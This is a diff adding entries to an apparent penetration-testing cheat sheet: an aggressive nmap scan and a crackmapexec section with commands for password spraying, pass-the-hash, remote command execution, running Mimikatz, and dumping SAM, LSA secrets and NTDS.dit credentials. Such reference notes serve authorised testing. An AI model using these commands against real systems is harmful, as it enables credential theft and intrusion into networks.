@@ -181,6 +181,7 @@ nc -nv <target> <port>
 nmap <target> # Only scan the 1000 most common ports by default.
 nmap -sV -sC -p- <target> # Full TCP port scan with service discovery and default scripts
 nmap -sC -sV -vv -O -p- -oA <file> <target> # Full TCP port scan with service/version detection, default scripts, OS detection, verbose output, and saved results in all formats.
+nmap -p- -sV -sC <target> -T5 -Pn # Full TCP port scan with service/version detection and default scripts, using aggressive timing (T5) and skipping host discovery (treats host as up)
 nmap --script <script name> -p<port> <target> # Runs a specific NSE script against a chosen port on the target host
 nmap -sV --script=banner <target> # Detects running services and retrieves service banners from the target
 nmap -A -p <ports> <target> # Performs aggressive scanning (OS detection, version detection, scripts, traceroute) on specified ports.
@@ -215,6 +216,25 @@ binwalk -Y <file> # Scans for YARA rule matches (custom pattern signatures)
 ./scratch/<image_id>/run.sh # Boots the firmware image in QEMU for dynamic analysis/emulation
 
 # Penetration testing
+
+## crackmapexec
+crackmapexec smb <target> -u '' -p '' --users # Attempts an anonymous/null SMB login and enumerates domain/local users if allowed
+crackmapexec smb <target> # Performs a basic SMB scan, showing hostname, domain, OS, and signing status
+crackmapexec smb <target> -u <user> -p <password> # Validates a single set of credentials against the target
+crackmapexec smb <target> -u <user> -p <password> --local-auth # Authenticates using local (non-domain) account credentials
+crackmapexec smb <targets.txt> -u <userlist> -p <passwordlist> # Password sprays a list of credentials across multiple hosts
+crackmapexec smb <target> -u <user> -p <password> --shares # Lists accessible SMB shares for the given credentials
+crackmapexec smb <target> -u <user> -p <password> --groups # Enumerates domain/local groups
+crackmapexec smb <target> -u <user> -p <password> --loggedon-users # Lists users currently logged on to the target
+crackmapexec smb <target> -u <user> -p <password> --sam # Dumps the local SAM database (requires admin privileges)
+crackmapexec smb <target> -u <user> -p <password> --lsa # Dumps LSA secrets (requires admin privileges)
+crackmapexec smb <target> -u <user> -H <NTLM hash> # Authenticates using a pass-the-hash (NTLM hash instead of a password)
+crackmapexec smb <target> -u <user> -p <password> -x "whoami" # Executes a remote command via SMB (requires admin privileges)
+crackmapexec smb <target> -u <user> -p <password> -M mimikatz # Runs the Mimikatz module to extract creds/secrets from memory
+crackmapexec smb <target> -u <user> -p <password> --ntds # Dumps the NTDS.dit file (domain controller credential database)
+crackmapexec winrm <target> -u <user> -p <password> # Validates credentials over WinRM (useful when SMB is restricted)
+crackmapexec ldap <target> -u <user> -p <password> --users # Enumerates domain users via LDAP
+crackmapexec smb <target> -u <user> -p <password> --rid-brute # Brute-forces RIDs to enumerate users/groups even with restrictive policies
 
 ## Metasploit
 ### Variable Reference
